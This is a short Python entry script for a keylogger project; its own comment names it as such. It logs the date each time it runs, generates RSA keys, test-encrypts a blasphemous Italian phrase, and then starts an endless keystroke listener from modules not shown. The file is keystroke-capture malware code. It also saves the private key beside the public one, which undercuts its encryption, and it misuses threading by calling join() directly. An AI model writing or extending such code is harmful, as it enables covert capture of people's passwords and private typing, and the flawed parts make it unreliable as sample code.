import threading
from listener import *
from datetime import date
from encryptionsys import *


def join():
    appListener()

    with open(fileName, "a") as f:
        dataToday = date.today()  # date of everytime keylogger is open
        f.write(str(dataToday) + "\n")
        f.close()

    key = RSA.generate(2048)
    public_key = key.publickey()
    private_key = key

    exportPublicKey("public_key.pem", public_key)
    exportPrivateKey("private_key.pem", private_key)

    # read public and private key
    with open('public_key.pem', 'rb') as f:
        new_public_key = RSA.import_key(f.read())

    with open('private_key.pem', 'rb') as f:
        new_private_key = RSA.import_key(f.read())

    ciphertext = encryption(new_public_key, b"il diocane")
    decypted_text = decryption(new_private_key, ciphertext)

    # print(ciphertext)
    # print(decypted_text)

    with Listener(on_press=on_press) as ls:
        while True:
            ls.join()


if __name__ == "__main__":
    try:
        threading.Thread(target=join()).start()
    except Exception as e:
        print(e)
